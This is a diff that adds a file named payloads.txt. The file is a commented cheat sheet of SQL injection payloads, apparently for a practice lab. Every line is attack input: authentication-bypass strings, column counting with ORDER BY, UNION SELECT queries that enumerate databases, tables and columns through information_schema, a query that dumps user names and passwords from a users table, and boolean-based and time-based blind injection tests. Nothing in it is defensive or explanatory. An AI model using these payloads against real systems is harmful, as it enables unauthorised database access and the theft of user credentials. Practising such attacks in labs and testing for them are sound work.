@@ -1,0 +1,44 @@
+# SQL Injection - Payloads (payloads.txt)
+
+# --- Basic tests ---
+1' OR '1'='1
+1' OR 1=1-- -
+' OR 'x'='x
+admin'-- -
+' OR 1=1#
+
+# --- Find column count ---
+1' ORDER BY 1-- -
+1' ORDER BY 2-- -
+1' ORDER BY 3-- -
+
+# --- UNION SELECT ---
+' UNION SELECT null, null-- -
+' UNION SELECT 1, 2-- -
+
+# --- Extract DB info ---
+' UNION SELECT null, version()-- -
+' UNION SELECT null, database()-- -
+' UNION SELECT null, user()-- -
+
+# --- List all databases ---
+' UNION SELECT null, schema_name FROM information_schema.schemata-- -
+
+# --- List tables ---
+' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database()-- -
+
+# --- List columns ---
+' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users'-- -
+
+# --- Dump users ---
+' UNION SELECT user, password FROM users-- -
+' UNION SELECT first_name, last_name FROM users-- -
+
+# --- Boolean-based blind ---
+1' AND 1=1-- -
+1' AND 1=2-- -
+1' AND substring(database(),1,1)='d'-- -
+
+# --- Time-based blind ---
+1' AND sleep(5)-- -
+1'; SELECT sleep(5)-- -
